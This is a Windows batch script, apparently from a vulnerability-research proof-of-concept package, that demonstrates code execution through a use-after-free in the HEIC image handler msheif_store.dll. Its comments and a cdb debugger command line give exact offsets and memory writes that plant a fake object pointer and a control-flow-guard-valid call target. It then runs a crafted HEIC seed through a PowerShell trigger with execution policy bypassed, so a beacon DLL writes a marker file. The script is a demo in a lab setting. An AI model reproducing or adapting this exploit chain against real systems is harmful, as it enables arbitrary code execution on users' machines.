@echo off
rem FULL-CHAIN code-execution demo (portable copy).
rem  beacon.dll (CFG-instrumented, fixed base 0x180000000) is loaded into the
rem  debuggee via PMH_BEACON. Breakpoint at the UAF list walk plants:
rem     [node+0x18] = node+0x40     (fake object pointer)
rem     [node+0x50] = 0x180001000   (call target = BeaconProc, CFG-valid)
rem  Continue: the destructor loads the call target from controlled memory,
rem  the process CFG check runs, and (if the target is valid) BeaconProc
rem  executes -> writes %USERPROFILE%\Desktop\pwned.txt.
rem  Requires: cdb.exe on PATH (or edit the CDB variable below).
rem  Usage:    fullchain.cmd <path-to-crash_seed.heic>
setlocal
set BEACON=%~dp0beacon.dll
set CDB=cdb.exe
set SEED=%~1
if "%SEED%"=="" set SEED=%~dp0..\poc\crash_seed.heic
if not exist "%BEACON%" (echo beacon.dll not found next to this script & exit /b 1)
if not exist "%SEED%" (echo seed not found: %SEED% & exit /b 1)

set PMH_BEACON=%BEACON%
del "%USERPROFILE%\Desktop\pwned.txt" 2>nul
%CDB% -y "srv*%LOCALAPPDATA%\Temp\symsrv_pmh*https://msdl.microsoft.com/download/symbols" -c "sxe ld:msheif_store.dll; g; bp msheif_store+0x1b4d0d; g; r; .if (poi(rdi+98h) != 0) { eq poi(rdi+98h)+18 poi(rdi+98h)+40; eq poi(rdi+98h)+50 0x180001000; g } .else { g }; lm m beacon; r; q" powershell -NoProfile -ExecutionPolicy Bypass -File "%~dp0..\repro\ps_trigger.ps1" -Mode trigger -InputFile "%SEED%" > fullchain.txt 2>&1
if exist "%USERPROFILE%\Desktop\pwned.txt" (
    type "%USERPROFILE%\Desktop\pwned.txt"
) else (
    echo NOT CREATED - beacon did not execute
)